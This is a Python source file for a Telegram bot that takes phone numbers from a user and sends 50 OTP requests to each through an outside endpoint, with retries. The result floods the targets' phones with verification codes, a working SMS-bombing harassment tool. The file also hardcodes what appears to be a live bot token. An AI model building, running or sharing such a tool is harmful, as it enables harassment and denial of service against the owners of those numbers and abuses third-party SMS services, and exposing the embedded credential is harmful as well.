import time
import requests
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)

# Replace with your bot token
BOT_TOKEN = "7709293848:AAFk7gPPMEZHqeGkA1MbTuCcFF53HqWah0s"
OTP_API_URL = "https://otp.glitchy.workers.dev/send?phone={phone}"

# State for conversation handler
ASK_PHONES = range(1)


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command handler."""
    await update.message.reply_text(
        "Welcome to the OTP Bot!\n\nPlease provide the phone numbers separated by commas to send OTPs (e.g., `+1234567890, +9876543210`).",
        parse_mode=ParseMode.MARKDOWN,
    )
    return ASK_PHONES


async def ask_phones(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send 50 OTPs to each phone number with a 5-second gap."""
    try:
        # Parse phone numbers
        phone_numbers = [phone.strip() for phone in update.message.text.split(",")]

        # Notify the user that processing is starting
        await update.message.reply_text(
            f"Starting to send OTPs to the following numbers:\n\n{', '.join(phone_numbers)}",
            parse_mode=ParseMode.MARKDOWN,
        )

        # Send OTPs to each phone number
        for phone_number in phone_numbers:
            await update.message.reply_text(
                f"🚀 Sending OTPs to *{phone_number}*...",
                parse_mode=ParseMode.MARKDOWN,
            )

            for i in range(50):  # Send 50 OTPs
                response = requests.get(OTP_API_URL.format(phone=phone_number))
                if response.status_code == 200 and response.json().get("status") == 1:
                    await update.message.reply_text(
                        f"✅ OTP {i + 1}/50 successfully sent to {phone_number}.",
                        parse_mode=ParseMode.MARKDOWN,
                    )
                else:
                    await update.message.reply_text(
                        f"⚠️ Failed to send OTP {i + 1}/50 to {phone_number}. Retrying...",
                        parse_mode=ParseMode.MARKDOWN,
                    )
                    # Retry up to 3 times
                    retries = 3
                    success = False
                    for retry in range(retries):
                        time.sleep(2)  # Wait before retrying
                        retry_response = requests.get(OTP_API_URL.format(phone=phone_number))
                        if retry_response.status_code == 200 and retry_response.json().get("status") == 1:
                            success = True
                            await update.message.reply_text(
                                f"✅ OTP {i + 1}/50 successfully sent to {phone_number} on retry {retry + 1}.",
                                parse_mode=ParseMode.MARKDOWN,
                            )
                            break
                    if not success:
                        await update.message.reply_text(
                            f"❌ Giving up on OTP {i + 1}/50 for {phone_number} after {retries} retries.",
                            parse_mode=ParseMode.MARKDOWN,
                        )
                        break

                # Wait 1 second between each OTP
                time.sleep(1)

            # Notify the user after completing 50 OTPs for the number
            await update.message.reply_text(
                f"🎉 Completed sending 50 OTPs to *{phone_number}*. Waiting 5 seconds before the next number.",
                parse_mode=ParseMode.MARKDOWN,
            )
            time.sleep(5)

        await update.message.reply_text(
            "✅ All OTPs have been sent successfully to all provided phone numbers.",
            parse_mode=ParseMode.MARKDOWN,
        )
    except Exception as e:
        await update.message.reply_text(
            f"❌ An error occurred: `{str(e)}`",
            parse_mode=ParseMode.MARKDOWN,
        )

    return ConversationHandler.END


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel the conversation."""
    await update.message.reply_text(
        "Operation canceled. If you want to start over, type /start."
    )
    return ConversationHandler.END


def main():
    """Main function to set up the bot."""
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    # Conversation handler with states
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            ASK_PHONES: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_phones)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    application.add_handler(conv_handler)

    # Start the bot
    application.run_polling()


if __name__ == "__main__":
    main()
